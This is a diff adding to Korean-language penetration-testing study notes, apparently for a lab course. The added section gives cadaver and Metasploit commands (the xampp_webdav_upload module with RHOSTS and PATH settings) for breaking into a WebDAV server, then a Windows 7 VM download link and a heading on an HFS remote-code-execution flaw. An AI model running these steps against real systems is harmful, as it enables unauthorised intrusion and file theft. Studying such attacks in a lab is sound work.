@@ -525,3 +525,32 @@ system() <- shell 명령어 - 웹 쉘의 위험성이 있음.
 
 ## 메타스플로잇을 이용한 webdav 시스템 침투
 
+```sh
+cadaver [host ip]
+```
+-kali의 webdav 툴
+
+```
+msf6 > use exploit/windows/http/xampp_webdav_upload.php
+```
+-webdav 툴 사용
+
+```
+msf6 > set RHOSTS [ip]
+msf6 > set PATH /dav/
+msf6 > exploit
+```
+-설정 후, exploit
+
+exploit 후, search와 download 명령어 사용 가능
+
+---
+
+## 윈도우 애플리케이션 RCE 취약점 사례 - 환경 구성
+
+윈도우 7 환경 가상 이미지  설치 파일 - 가상환경에서 불러와서 설치https://drive.google.com/file/d/177T5RTbVkM9K0MpnFFP8DSl3e0ckRR68/view
+
+---
+
+## 윈도우 애플리케이션 RCE 취약점 사례 - HFS 입력값 검증 미흡
+
